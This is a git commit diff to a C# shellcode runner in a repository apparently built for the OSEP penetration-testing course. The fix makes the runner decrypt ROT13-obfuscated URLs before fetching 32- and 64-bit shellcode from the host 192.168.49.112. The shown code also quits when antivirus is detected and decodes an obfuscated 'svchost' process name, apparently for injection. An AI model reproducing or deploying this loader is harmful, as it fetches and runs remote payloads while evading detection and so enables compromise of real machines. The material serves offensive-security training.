e6cba28d6181cb7200907fc820b2c76905c5e5e7
dos-m0nk3y <53410240+dos-m0nk3y@users.noreply.github.com>
2023-04-05 02:10:43 -0400

    Fix error on runner.cs where address is not decrypted

--- OSEP/C#/runner.cs
+++ OSEP/C#/runner.cs
@@ -160,8 +160,8 @@ public class ShellcodeRunner
         if (DetectAV())
             return;
 
-        byte[] shellcode32 = LoadShellcode("uggc://192.168.49.112/furyypbqr32.ova.rap");
-        byte[] shellcode64 = LoadShellcode("uggc://192.168.49.112/furyypbqr64.ova.rap");
+        byte[] shellcode32 = LoadShellcode(Decrypt("uggc://192.168.49.112/furyypbqr32.ova.rap"));
+        byte[] shellcode64 = LoadShellcode(Decrypt("uggc://192.168.49.112/furyypbqr64.ova.rap"));
 
         // svchost
         string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(Decrypt("p3MwnT9mqN==")));
